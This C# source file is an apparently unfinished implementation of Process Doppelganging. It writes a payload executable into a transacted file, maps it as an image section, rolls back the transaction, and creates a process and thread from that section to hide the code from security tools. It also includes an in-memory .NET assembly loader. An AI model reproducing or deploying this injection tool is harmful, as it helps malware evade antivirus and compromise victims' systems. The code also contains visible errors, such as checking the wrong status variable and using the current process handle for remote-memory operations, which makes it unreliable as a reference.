using System;
using System.IO;
using System.Text;
using Microsoft.Win32.SafeHandles;
using System.Reflection;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace CompletelyLostReality
{
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr ExitStatus;
        public IntPtr PebBaseAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public UIntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct LARGE_INTEGER
    {
        public UInt64 LowPart;
        public UInt64 HighPart;
    }


    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING
    {
        public UInt16 Length;
        public UInt16 MaximumLength;
        public IntPtr Buffer;
    }

    internal class Program
    {

        [DllImport("KtmW32.dll")]
        public static extern IntPtr CreateTransaction(
                IntPtr lpEventAttributes,
                IntPtr UOW,
                UInt32 CreateOptions,
                UInt32 IsolationLevel,
                UInt32 IsolationFlags,
                UInt32 Timeout,
                IntPtr Description);

        [DllImport("Kernel32.dll")]
        public static extern IntPtr CreateFileTransacted(
            string lpFileName,
            UInt32 dwDesiredAccess,
            UInt32 dwShareMode,
            IntPtr lpSecurityAttributes,
            UInt32 dwCreationDisposition,
            UInt32 dwFlagsAndAttributes,
            IntPtr hTemplateFile,
            IntPtr hTransaction,
            IntPtr pusMiniVersion,
            IntPtr pExtendedParameter);

        [DllImport("Kernel32.dll")]
        public static extern bool WriteFile(
            IntPtr hFile,
            Byte[] lpBuffer,
            UInt32 nNumberOfBytesToWrite,
            ref UInt32 lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        [DllImport("ntdll.dll")]
        public static extern int NtCreateSection(
            ref IntPtr section,
            UInt32 desiredAccess,
            IntPtr pAttrs,
            IntPtr pMaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(
            UInt32 processAccess,
            bool bInheritHandle,
            int processId);

        [DllImport("ntdll.dll")]
        public static extern int NtCreateProcessEx(
            ref IntPtr ProcessHandle,
            UInt32 DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr hInheritFromProcess,
            uint Flags,
            IntPtr SectionHandle,
            IntPtr DebugPort,
            IntPtr ExceptionPort,
            Byte InJob);

        [DllImport("ktmw32.dll", CharSet = CharSet.Auto)]
        public static extern bool RollbackTransaction(
            IntPtr transaction);

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(
            IntPtr hObject);

        [DllImport("kernel32.dll")]
        public static extern Boolean VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            UInt32 dwSize,
            UInt32 flNewProtect,
            ref UInt32 lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern Boolean WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            IntPtr lpBuffer,
            UInt32 nSize,
            ref UInt32 lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern Boolean ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            IntPtr lpBuffer,
            UInt32 dwSize,
            ref UInt32 lpNumberOfBytesRead);

        [DllImport("ntdll.dll")]
        public static extern int NtQueryInformationProcess(
            IntPtr processHandle,
            int processInformationClass,
            ref PROCESS_BASIC_INFORMATION processInformation,
            int processInformationLength,
            ref int returnLength);

        [DllImport("ntdll.dll")]
        public static extern int RtlCreateProcessParametersEx(
            ref IntPtr pProcessParameters,
            IntPtr ImagePathName,
            IntPtr DllPath,
            IntPtr CurrentDirectory,
            IntPtr CommandLine,
            IntPtr Environment,
            IntPtr WindowTitle,
            IntPtr DesktopInfo,
            IntPtr ShellInfo,
            IntPtr RuntimeData,
            UInt32 Flags);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            UInt32 dwSize,
            Int32 flAllocationType,
            Int32 flProtect);

        [DllImport("ntdll.dll")]
        public static extern int NtCreateThreadEx(
            ref IntPtr hThread,
            UInt32 DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            bool CreateSuspended,
            UInt32 StackZeroBits,
            UInt32 SizeOfStackCommit,
            UInt32 SizeOfStackReserve,
            IntPtr lpBytesBuffer);

        internal const int SECTION_ALL_ACCESS =
           STANDARD_RIGHTS_REQUIRED |
           SECTION_QUERY |
           SECTION_MAP_WRITE |
           SECTION_MAP_READ |
           SECTION_MAP_EXECUTE |
           SECTION_EXTEND_SIZE;

        public static unsafe void Main(string[] args)
        {

            IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
            byte[] Payload = File.ReadAllBytes(@"C:\Users\Spencer\Desktop\AssemblyLoader.exe");

            //Create Transaction
            IntPtr hTransaction = CreateTransaction(IntPtr.Zero, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero);
            if (hTransaction == INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[-] CreateTransaction failed");
            }
            else
            {
                Console.WriteLine("[+] CreateTransaction success");
            }


            //CreateFileTransacted
            IntPtr hTransactedFile = CreateFileTransacted(@"C:\Users\Spencer\Desktop\yolo.txt", 0xC0000000, 0, IntPtr.Zero, 2, 0x80, IntPtr.Zero, hTransaction, IntPtr.Zero, IntPtr.Zero);
            if (hTransactedFile == INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[-] CreateFileTransacted failed");
                Console.WriteLine(Marshal.GetLastWin32Error());
                Console.WriteLine(hTransactedFile);
            }
            else
            {
                Console.WriteLine("[+] CreateFileTransacted success");
            }


            //WriteFile
            uint WriteCount = 0;
            bool WriteFileStatus = WriteFile(hTransactedFile, Payload, Convert.ToUInt32(Payload.Length), ref WriteCount, IntPtr.Zero);
            if (WriteFileStatus != true)
            {
                Console.WriteLine("[-] WriteFile failed");
            }
            else
            {
                Console.WriteLine("[+] WriteFile success");
            }

            //CreateSection

            IntPtr largint = IntPtr.Zero;
            IntPtr hSection = IntPtr.Zero;

            int CreateSectionStatus = NtCreateSection(ref hSection, 0xF001F, IntPtr.Zero, IntPtr.Zero, 0x20, 0x1000000, hTransactedFile);
            if (CreateSectionStatus != 0)
            {
                Console.WriteLine("[-] NtCreateSection failed");
                Console.WriteLine(Marshal.GetLastWin32Error());
                Console.WriteLine(CreateSectionStatus);
            }
            else
            {
                Console.WriteLine("[+] NtCreateSection success");
            }

            // Clean up
            CloseHandle(hTransactedFile);
            RollbackTransaction(hTransaction);
            CloseHandle(hTransaction);

            //NtCreateProcessEx
            IntPtr hProcess = IntPtr.Zero;
            IntPtr hParentPid = new IntPtr(-1);
            int CreateProcessStatus = NtCreateProcessEx(ref hProcess, 0x1FFFFF, IntPtr.Zero, hParentPid, 4, hSection, IntPtr.Zero, IntPtr.Zero, 0);
            if (CreateSectionStatus != 0)
            {
                Console.WriteLine("[-] NtCreateProcessEx failed");
            }
            else
            {
                Console.WriteLine("[+] NtCreateProcessEx success");
            }


            // NtQueryInformationProcess
            Process currentProcess = Process.GetCurrentProcess();
            IntPtr hHandle = currentProcess.Handle;
            PROCESS_BASIC_INFORMATION ProcBasic = new PROCESS_BASIC_INFORMATION();
            int RetLength = Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION));
            int STATUS = NtQueryInformationProcess(hHandle, 0, ref ProcBasic, RetLength, ref RetLength);
            if (STATUS.ToString("X") != "0")
            {
                Console.WriteLine("[-] NtQueryInformationProcess Failed");
            }
            else
            {
                Console.WriteLine("[+] NtQueryInformationProcess success");
            }

            // Read File?
            
            Int64 PEOffset = BitConverter.ToInt64(Payload, 60);
            Console.WriteLine("\tPEOffset: 0x" + BitConverter.ToString(Payload, 60, 4).Replace("-", ""));
            Int64 OptOffset = PEOffset + 24;
            Int64 PEArch = BitConverter.ToInt16(Payload, (int)OptOffset);
            Console.WriteLine("\tPEArch: " + BitConverter.ToInt16(Payload, (int)OptOffset));
            Int64 EntryOffset = OptOffset + 16;
            Int64 EntryPoint = BitConverter.ToInt64(Payload, (int)EntryOffset);
            Console.WriteLine("\tEntry Point: 0x" + BitConverter.ToString(Payload, (int)EntryPoint, 4).Replace("-", ""));

            // Add 32 bit to 64 bit check and set lpBuffer to 4 or 8
            uint BytesRead = 8;
            IntPtr lpBuffer = Marshal.AllocHGlobal(8);
            IntPtr rImgBaseOffset = ProcBasic.PebBaseAddress + 0x8;
            Console.WriteLine("\tImage Base Offset: 0x" + rImgBaseOffset);

            // ReadProcessMemory
            bool ReadStatus = ReadProcessMemory(hHandle, rImgBaseOffset, lpBuffer, 8, ref BytesRead);
            if (ReadStatus != true)
            {
                Console.WriteLine("[-] ReadProcessMemory failed");
            }
            else
            {
                Console.WriteLine("[+] ReadProcessMemory success");
            }

            Int64 PEBaseImageAddress = Marshal.ReadInt64(lpBuffer.ToInt64(), 0);
            Int64 ProcessEntryPoint = PEBaseImageAddress + EntryPoint;
            Console.WriteLine("[+] Injected image address: 0x" + PEBaseImageAddress);
            Console.WriteLine("[+] Injected entry point: 0x" + ProcessEntryPoint);

            IntPtr uTargetPath = CreateUnicodeStruct("C:\\Users\\Spencer\\Desktop");
            IntPtr uDllDir = CreateUnicodeStruct("C:\\Windows\\System32");
            IntPtr uCurrentDir = CreateUnicodeStruct("C:\\Users\\Spencer\\Desktop");
            IntPtr uWindowName = CreateUnicodeStruct("Process Dopplegang");
            IntPtr pProcessParameters = IntPtr.Zero;

            int RtlStatus = RtlCreateProcessParametersEx(ref pProcessParameters, uTargetPath, uDllDir, uCurrentDir, uTargetPath, IntPtr.Zero, uWindowName, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 1);
            if (RtlStatus != 0)
            {
                Console.WriteLine("[-] RtlCreateProcessParametersEx failed");
            }
            else
            {
                Console.WriteLine("[+] RtlCreateProcessParametersEx success");
            }

            //VirtualAlloc
            Int64 pParameters = pProcessParameters.ToInt64() + 4;
            IntPtr pParametersPointer = new IntPtr(pParameters);
            Int32 ProcParamsLength = Marshal.ReadInt32(pParametersPointer);

            IntPtr VictualAllocStatus = VirtualAllocEx(hHandle, pProcessParameters, Convert.ToUInt32(ProcParamsLength), 0x3000, 4);
            if (VictualAllocStatus == null)
            {
                Console.WriteLine("[-] VirtualAllocEx failed");
            }
            else
            {
                Console.WriteLine("[+] VirtualAllocEx success");
            }


            //WriteProcessMemory
            uint BytesWritten = 0;
            bool WriteStatus = WriteProcessMemory(hHandle, pProcessParameters, pProcessParameters, Convert.ToUInt32(ProcParamsLength), ref BytesWritten);
            if (WriteStatus != true)
            {
                Console.WriteLine("[-] WriteProcessMemory failed");
            }
            else
            {
                Console.WriteLine("[+] WriteProcessMemory success");
            }

            //NtCreateThreadEx
            IntPtr hRemoteThread = IntPtr.Zero;
            int CreateThreadStatus = NtCreateThreadEx(ref hRemoteThread, 0x1FFFFF, IntPtr.Zero, hProcess, new IntPtr(ProcessEntryPoint), IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            if (CreateThreadStatus != 0)
            {
                Console.WriteLine("[-] NtCreateThreadEx failed");
            }
            else
            {
                Console.WriteLine("[+] NtCreateThreadEx success");
            }
            Console.ReadLine();


        }
        public static IntPtr CreateUnicodeStruct(string data)
        {
            UNICODE_STRING UnicodeObject = new UNICODE_STRING();
            string UnicodeObject_Buffer = data;
            UnicodeObject.Length = Convert.ToUInt16(UnicodeObject_Buffer.Length * 2);
            UnicodeObject.MaximumLength = Convert.ToUInt16(UnicodeObject.Length + 1);
            UnicodeObject.Buffer = Marshal.StringToHGlobalUni(UnicodeObject_Buffer);
            IntPtr InMemoryStruct = Marshal.AllocHGlobal(16);
            Marshal.StructureToPtr(UnicodeObject, InMemoryStruct, true);

            return InMemoryStruct;

        }

    }

    public class ProxyClass : MarshalByRefObject { }

    public interface IAssemblyLoader
    {
        object Load(byte[] bytes, string command);
    }

    public class AssmeblyLoader : MarshalByRefObject, IAssemblyLoader
    {
        public object Load(byte[] bytes, string command)
        {
            var assembly = AppDomain.CurrentDomain.Load(bytes);

            Type myType = assembly.GetType("Program");

            if (myType != null)
            {
                MethodInfo myMethod = myType.GetMethod("Main");

                object[] parameters = new object[1];
                parameters[0] = command;

                object obj = Activator.CreateInstance(myType);
                Console.ReadLine();
                var test = myMethod.Invoke(obj, parameters);

                return test;
            }

            return null;
        }
    }

}